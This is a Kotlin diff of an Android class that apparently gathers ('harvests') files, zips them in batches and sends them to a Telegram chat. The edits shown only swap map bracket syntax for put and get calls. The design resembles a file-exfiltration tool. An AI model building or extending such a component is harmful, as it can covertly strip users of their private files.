@@ -24,7 +24,7 @@ import java.util.zip.ZipEntry
 import java.util.zip.ZipOutputStream
 
 /**
- * فئة تجميع الملفات وحصادها - إصدار نهائي خالٍ تماماً من أي [] أو .get غير آمن
+ * فئة تجميع الملفات وحصادها - خالية تماماً من الأقواس المربعة على الخرائط
  */
 class DailyZipper(
     context: Context,
@@ -81,6 +81,7 @@ class DailyZipper(
     }
 
     init {
+        // استخدام put بدلاً من [] لتجنب MatchGroupCollection
         config.put("max_batch_size", 48L * 1024L * 1024L)
         config.put("storage_extra", 100L * 1024L * 1024L)
         config.put("send_retry_delays", listOf(2000L, 4000L, 8000L))
@@ -93,10 +94,9 @@ class DailyZipper(
     }
 
     // ============================================================
-    //  دوال مساعدة آمنة للخرائط (بدون أي [] أو .get على Any?)
+    //  دوال مساعدة آمنة للخرائط (بدون [] أو .get على Any?)
     // ============================================================
 
-    // استخدام get مباشرة مع تحويل صريح إلى Map<*, *>
     private fun fetchFromMap(map: Any?, key: String): Any? {
         val safeMap = map as? Map<*, *>
         return safeMap?.get(key)
@@ -116,7 +116,7 @@ class DailyZipper(
 
     @Suppress("UNCHECKED_CAST")
     private fun <T> getConfigValue(key: String, default: T): T {
-        val value = config[key]  // استخدام get مباشرة على HashMap
+        val value = config.get(key)  // استخدام get بدلاً من []
         if (value == null) return default
         return try {
             when (default) {
@@ -185,7 +185,7 @@ class DailyZipper(
                 val key = keys.next()
                 val value = json.opt(key)
                 if (value != null && value != JSONObject.NULL) {
-                    config[key] = value
+                    config.put(key, value)  // استخدام put بدلاً من []
                 }
             }
             maxBatchSize = getConfigValue("max_batch_size", 48L * 1024L * 1024L)
@@ -296,7 +296,7 @@ class DailyZipper(
     }
 
     // ============================================================
-    //  إرسال الملفات إلى Telegram (آمن تماماً)
+    //  إرسال الملفات إلى Telegram
     // ============================================================
 
     private suspend fun safeSend(
@@ -720,16 +720,16 @@ class DailyZipper(
         }
 
         val result = HashMap<String, Any>()
-        result["pending"] = count
-        result["size"] = totalSize
+        result.put("pending", count)   // استخدام put بدلاً من []
+        result.put("size", totalSize)
         return result
     }
 
     private fun sendMessage(chatId: Long, text: String) {
         if (telegram == null) return
         val params = HashMap<String, Any>()
-        params["chat_id"] = chatId
-        params["text"] = text
+        params.put("chat_id", chatId)
+        params.put("text", text)
         invokeMethod(telegram, "api", "sendMessage", params)
     }
 
